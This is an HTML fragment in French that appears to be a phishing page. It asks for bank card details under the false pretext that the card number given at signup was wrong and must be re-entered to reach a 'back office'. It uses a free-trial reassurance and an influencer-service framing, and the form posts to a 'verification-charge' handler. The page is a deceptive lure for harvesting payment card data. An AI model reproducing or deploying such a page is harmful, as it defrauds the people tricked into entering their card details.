  ...
  <div class="content--wrap">
    ...
    <div class="main-container">
			...
			<section class="main-container">
			  <center><h3 class="text--logo light color--black">Vos coordonnées bancaires </h3></center>
			  <center><h4 class="text--logo light color--primary">Aucun prélèvement avant la fin de votre période d'essai</h4></center>
			  ...
			  <div class="container">
				...
				<div class="main2">
				 ...
				 <form action="/bxoffice-traitement/verification-charge.php" method="post" id="payment-form">
				  <div class="form-row">
				...
				<a href="shop-checkout-payment.html" class="btn btn-group btn-default">Next Step <i class="icon-right-open-big"></i></a>
                        ...
                        <div class="col-sm-5 col-sm-offset-1 col-xs-12 mt--xs--2">
                          <div class="pricing pricing-2 boxed boxed--border boxed--lg row no-gutters">
                            <div class="col-lg-12">
                              <h2>Vérification</h2> <span class="p">Nous accompagnons plus de  50.000 Influenceurs<img class="rating-xs" src="img/4-5-star.png"></span>
                              <hr>
			    </div>
			      ...
			      <!-- Debut -->
                    ...
                    <ol class="process-3">
                      <li class="process_item">
                        <div class="process__number one"> <span>1</span> </div>
                        <div class="process__body">
                          <h3>Coordonnées bancaires</h3>
                          <p> Le numéro de carte renseigné à l'inscription <b>était erroné</b>. Veuillez le saisir à nouveau afin d'accéder au "back office".</p>
                        </div>
                      </li>
